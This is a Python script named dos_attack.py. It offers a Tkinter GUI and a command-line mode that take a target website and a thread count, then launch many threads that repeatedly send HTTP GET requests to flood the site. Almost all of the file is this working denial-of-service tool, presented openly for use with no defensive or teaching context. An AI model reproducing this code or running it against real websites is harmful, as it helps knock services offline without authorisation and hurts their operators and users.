#	File Name 	 	: dos_attack.py
#	Created By 	 	: Dheeraj Deshmukh
#	last modified	: 21 sept 2020
#	Language		: Python
#	python version  : python3.6
#	Requirment 		: Tkinter , Request module and argparse
#
#	Note : for Gui interface download images from thhir repository ***** 


import argparse
from tkinter import *
import tkinter as tk
from tkinter import ttk
from tkinter import font
from tkinter import  colorchooser,filedialog,font,Image
from tkinter import messagebox
from PIL import ImageTk, Image
from threading import Thread
import requests

#	For Arguments :::

parser = argparse.ArgumentParser()
parser.add_argument("-w","--website",help = "enter target website ")
parser.add_argument("-t","--thread",help = "enter number of thread ", type = int)
parser.add_argument("--G",help = "Graphical Interface ")
args = parser.parse_args()

#	For Graphical Interface ::::



if(args.G):

	root = tk.Tk()
	root.geometry('700x400')
	root.title("Dos Attack")
	root.configure(bg = 'black')

# Images ::::::::

	img = ImageTk.PhotoImage(Image.open('hck5.jpg'))
	panel = Label(root,image = img)

	one_btn = Label(root, image = img)
	one_btn.grid(row = 0,column = 0)

	img2 = ImageTk.PhotoImage(Image.open('dosimg2.jpg'))
	panel1 = Label(root,image = img2)

	one_btn1 = Label(root, image = img2)
	one_btn1.grid(row = 0,column = 1,columnspan = 3)


#	Labeles :::::::


	website_label = ttk.Label(root,text = "Enter Web site : ")
	website_label.grid(row=1 , column = 0 , padx=8,pady=8,sticky = tk.W)
	website_label.config(font=("Courier", 20))
	thread_label = ttk.Label(root, text = "Enter threads  : ")
	thread_label.grid(row=2 , column = 0 ,padx=8,pady=8, sticky = tk.W)
	thread_label.config(font=("Courier", 20))


#	Label Entry Box :::::::


	webvar = tk.StringVar()
	web_entrybox = tk.Entry(root, width = 26 ,textvariable = webvar)
	web_entrybox.grid(row=1 , column = 1 ,ipady = 8,padx=8,pady=8, sticky = tk.W)

	threadvar = tk.StringVar()
	thread_entrybox = tk.Entry(root, width = 26 ,textvariable = threadvar)
	thread_entrybox.grid(row=2, column = 1 ,ipady = 8 ,padx=8,pady=8,sticky = tk.W)


#	Functions



	
	def action(): #function for graphical interface ::::::
		start_label = ttk.Label(root,text = "Process Started.....")
		start_label.grid(row=6 , column = 1 , padx=8,pady=8,sticky = tk.W)

		target_website = webvar.get()
		therad_count = threadvar.get()
		class Attack:
			def __init__(self, ipaddr):
               			self.ipaddr = ipaddr
			def Atk(self):
				for i in range (50):
					targett = requests.get(target_website)

		obj1 = Attack(target_website)
		t1 = Thread(target = obj1.Atk)
		t1.start()
		for i in range(int(therad_count)):
			obj = Attack(target_website)
			t = Thread(target = obj.Atk)
			t.start()

			


	def action1(): #To stop Graphical Interface
		stop_label = ttk.Label(root,text = "Process Stop......")
		stop_label.grid(row=6 , column = 1 , padx=8,pady=8,sticky = tk.W)
		root.quit()
		root.destroy()
		exit()
		

#	Buttons

	submitbtn = ttk.Button(root, text = "Start",command = action)
	submitbtn.grid(row = 7 , column = 0,padx = 20,pady=20)


	submitbtn1 = ttk.Button(root, text = "Stop",command = action1)
	submitbtn1.grid(row = 7 , column = 1,padx = 20,pady=20)
	root.mainloop()

#Code for cli :::::::::::

if args.website and args.thread :
	class Attack:
		def __init__(self, ipaddr):
			self.ipaddr = ipaddr
		def Atk(self):
			for i in range (50):
				targett = requests.get(str(args.website))
				print(f"Process Started.....transmiting packet -- {i}")

	obj1 = Attack(str(args.website))
	t1 = Thread(target = obj1.Atk)
	t1.start()
	for i in range(int(args.thread)):
		obj = Attack(str(args.website))
		t = Thread(target = obj.Atk)
		t.start()
else:
	print("please use -h or --help")
	root.destroy()
	exit()

























